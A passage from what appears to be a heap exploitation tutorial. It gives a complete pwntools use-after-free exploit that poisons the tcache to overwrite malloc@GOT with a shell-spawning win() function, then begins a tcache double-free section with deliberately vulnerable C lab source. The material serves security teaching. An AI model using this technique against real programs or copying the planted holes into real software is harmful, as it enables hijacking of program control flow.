</span></span><span style="display:flex;"><span>0x0000000000401359  allocate
</span></span><span style="display:flex;"><span>0x0000000000401405  free_chunk
</span></span><span style="display:flex;"><span>0x00000000004014a5  edit
</span></span><span style="display:flex;"><span>0x0000000000401566  list
</span></span><span style="display:flex;"><span>0x000000000040167e  win
</span></span><span style="display:flex;"><span>0x00000000004016c1  main
</span></span><span style="display:flex;"><span>0x0000000000401830  __libc_csu_init
</span></span><span style="display:flex;"><span>0x00000000004018a0  __libc_csu_fini
</span></span><span style="display:flex;"><span>0x00000000004018a8  _fini
</span></span></code></pre></div><p>We can use <code>template</code> tool from Pwndbg to create template for our exploit.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ template --quiet ./uaf &gt; exploit.py
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Automatically detecting challenge binaries...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found libc binary <span style="color:#e6db74">&#39;libc.so.6&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(args<span style="color:#f92672">.</span>EXE <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;./uaf&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL_LIBC:
</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> exe<span style="color:#f92672">.</span>libc
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    library_path <span style="color:#f92672">=</span> libcdb<span style="color:#f92672">.</span>download_libraries(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> library_path:
</span></span><span style="display:flex;"><span>        exe <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF<span style="color:#f92672">.</span>patch_custom_libraries(exe<span style="color:#f92672">.</span>path, library_path)
</span></span><span style="display:flex;"><span>        libc <span style="color:#f92672">=</span> exe<span style="color:#f92672">.</span>libc
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">tbreak main
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -- Exploit goes here --</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>We got template now we can just write our exploit normally.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(args<span style="color:#f92672">.</span>EXE <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;./uaf&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL_LIBC:
</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> exe<span style="color:#f92672">.</span>libc
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    library_path <span style="color:#f92672">=</span> libcdb<span style="color:#f92672">.</span>download_libraries(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> library_path:
</span></span><span style="display:flex;"><span>        exe <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF<span style="color:#f92672">.</span>patch_custom_libraries(exe<span style="color:#f92672">.</span>path, library_path)
</span></span><span style="display:flex;"><span>        libc <span style="color:#f92672">=</span> exe<span style="color:#f92672">.</span>libc
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">tbreak main
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(size):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>size<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(index):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;2 </span><span style="color:#e6db74">{</span>index<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode()) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(index,data):
</span></span><span style="display:flex;"><span>    temp <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;3 </span><span style="color:#e6db74">{</span>index<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode()
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,temp<span style="color:#f92672">+</span>data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -- Exploit goes here --</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>We added <code>malloc</code>, <code>free</code>, <code>edit</code> functions for our ease case. So final exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(args<span style="color:#f92672">.</span>EXE <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;./uaf&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL_LIBC:
</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> exe<span style="color:#f92672">.</span>libc
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    library_path <span style="color:#f92672">=</span> libcdb<span style="color:#f92672">.</span>download_libraries(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> library_path:
</span></span><span style="display:flex;"><span>        exe <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF<span style="color:#f92672">.</span>patch_custom_libraries(exe<span style="color:#f92672">.</span>path, library_path)
</span></span><span style="display:flex;"><span>        libc <span style="color:#f92672">=</span> exe<span style="color:#f92672">.</span>libc
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">tbreak main
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(size):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>size<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(index):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;2 </span><span style="color:#e6db74">{</span>index<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode()) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(index,data):
</span></span><span style="display:flex;"><span>    temp <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;3 </span><span style="color:#e6db74">{</span>index<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode()
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,temp<span style="color:#f92672">+</span>data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -- Exploit goes here --</span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 1: Allocate a chunk of size 8</span>
</span></span><span style="display:flex;"><span>malloc(<span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 2: Free it ‚Äî this puts it into the tcache freelist</span>
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 3: Overwrite the tcache forward pointer with malloc@GOT</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This sets up a Use-After-Free to redirect next malloc to overwrite malloc@GOT</span>
</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">0</span>, pack(exe<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>malloc))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 4: Allocate a chunk (gets chunk 0 back)</span>
</span></span><span style="display:flex;"><span>malloc(<span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 5: Allocate again ‚Äî gets a chunk at malloc@GOT</span>
</span></span><span style="display:flex;"><span>malloc(<span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 6: Overwrite malloc@GOT with the address of win() function</span>
</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">2</span>, pack(exe<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>win))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 7: Trigger malloc() ‚Äî this will now jump to win()</span>
</span></span><span style="display:flex;"><span>malloc(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="0x15---double-free-vulnerability-tcache">0x15 - Double Free Vulnerability Tcache</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MALLOC &#34;1&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FREE &#34;2&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define LIST &#34;4&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define EDIT &#34;3&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define EXIT &#34;5&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define FREED 0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define UNDERUSE 1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> ptrs[<span style="color:#ae81ff">100</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> used[<span style="color:#ae81ff">100</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> request_size[<span style="color:#ae81ff">100</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> cnt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">print_menu</span>(){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>MENU[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Choose from the following menu:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;1. malloc chunk eg 1 20</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;2. free chunk eg 2 0</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;3. edit chunk content eg 3 0 AAAA</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;4. list chunks</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;5. exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">6</span>; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;%s&#34;</span>, MENU[i]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">allocate</span>(<span style="color:#66d9ef">int</span> n){
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Allocating %d bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, n);
</span></span><span style="display:flex;"><span>  ptrs[cnt] <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(n);
</span></span><span style="display:flex;"><span>  used[cnt] <span style="color:#f92672">=</span> UNDERUSE;
</span></span><span style="display:flex;"><span>  request_size[cnt] <span style="color:#f92672">=</span> n;
</span></span><span style="display:flex;"><span>  cnt<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">free_chunk</span>(<span style="color:#66d9ef">int</span> n){
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Freeing pointer %d: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, n, ptrs[n]);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(ptrs[n]);
</span></span><span style="display:flex;"><span>  used[n] <span style="color:#f92672">=</span> FREED;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">edit</span>(<span style="color:#66d9ef">int</span> n, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (used[n] <span style="color:#f92672">==</span> FREED)
</span></span><span style="display:flex;"><span>	 <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Editing pointer %d: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, n, ptrs[n]);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> l1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(ptrs[n]);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> l2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(s);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> l;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (l1 <span style="color:#f92672">&lt;</span> l2) l <span style="color:#f92672">=</span> l2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> l <span style="color:#f92672">=</span> l1;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(ptrs[n], s, l);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">list</span>(){
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Index</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Pointers</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Requested Size</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Status</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> cnt; i<span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%u</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span>, i, ptrs[i], request_size[i]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (used[i] <span style="color:#f92672">==</span> UNDERUSE)
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Under Use</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (used[i] <span style="color:#f92672">==</span> FREED)
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Freed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[1;31m[+] PWNED!!!</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">execl</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;/bin/sh&#34;</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">100</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> str[<span style="color:#ae81ff">100</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> n;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stderr, NULL);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print_menu</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">90</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sscanf</span>(buf <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(MALLOC), <span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>n);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">allocate</span>(n);
</span></span><span style="display:flex;"><span>    }
